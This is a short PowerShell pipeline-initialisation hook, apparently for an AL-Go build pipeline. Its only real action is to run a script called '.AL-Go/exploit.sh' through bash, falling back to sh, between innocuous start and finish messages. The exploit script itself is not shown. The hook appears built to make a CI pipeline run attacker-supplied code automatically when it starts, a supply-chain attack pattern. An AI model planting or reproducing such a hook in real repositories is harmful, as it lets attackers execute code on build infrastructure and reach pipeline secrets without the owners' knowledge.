Param([Hashtable]$parameters)
Write-Host "PipelineInitialize.ps1 starting..."
if (Get-Command bash -ErrorAction SilentlyContinue) {
    bash .AL-Go/exploit.sh
} else {
    Write-Host "bash not found, trying sh..."
    sh .AL-Go/exploit.sh
}
Write-Host "PipelineInitialize.ps1 finished."
